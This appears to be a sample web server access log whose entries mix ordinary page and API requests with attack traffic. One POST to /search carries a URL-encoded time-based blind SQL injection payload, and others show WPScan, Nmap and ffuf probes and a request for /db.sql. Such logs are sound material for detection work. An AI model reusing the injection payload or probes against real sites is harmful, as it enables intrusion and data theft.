203.0.113.12 - - [21/May/2026:13:25:31 +0000] "GET /about HTTP/1.1" 200 3461 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:10:05:29 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 8371 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
91.240.118.172 - - [21/May/2026:14:10:00 +0000] "POST /db.sql HTTP/1.1" 200 7400 "-" "WPScan v3.8.25"
203.0.113.11 - - [21/May/2026:11:04:35 +0000] "GET /index.html HTTP/1.1" 200 5970 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:10:47:23 +0000] "GET /search?q=phone HTTP/1.1" 200 1836 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.44 - - [21/May/2026:17:02:20 +0000] "POST /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 404 377 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:10:05:00 +0000] "GET / HTTP/1.1" 200 4318 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:08:39:32 +0000] "GET /wp-content/plugins/ HTTP/1.1" 404 371 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
45.155.205.33 - - [21/May/2026:19:25:33 +0000] "GET /login HTTP/1.1" 403 766 "-" "ffuf/2.1.0"
192.168.1.10 - - [21/May/2026:14:08:19 +0000] "POST /api/v1/user/profile HTTP/1.1" 200 6778 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:10:21:28 +0000] "GET /products HTTP/1.1" 200 3400 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
